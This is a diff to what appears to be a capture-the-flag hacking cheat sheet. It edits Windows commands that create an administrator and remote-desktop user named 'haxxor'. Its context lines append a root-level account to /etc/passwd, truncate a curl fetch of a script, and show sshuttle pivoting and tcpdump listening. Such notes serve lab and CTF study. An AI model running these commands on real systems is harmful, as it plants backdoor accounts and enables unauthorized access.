@@ -11,9 +11,9 @@ curl -s https://raw.githubusercontent.com/ChrisPritchard/ctf-writeups/master/thm
 - passwd user to add (pass123): `echo 'user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root:/bin/bash' >> /etc/passwd` (note the single quotes so $ is ignored)
 - adding windows users from cmd line (or rce):
     ```
-    cmd /c "net user /add haxxor P@ssw0rd1"
-    cmd /c "net localgroup "administrators" haxxor /add"
-    cmd /c "net localgroup "Remote Desktop Users" haxxor /add"
+    net user /add haxxor P@ssw0rd1
+    net localgroup "administrators" haxxor /add
+    net localgroup "Remote Desktop Users" haxxor /add
     ```
 - ssh shuttle (to a machine with ssh AND python): `sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET` (ssh command is required if you need a keyfile)
 - listen for pings: `tcpdump -i eth0 icmp`
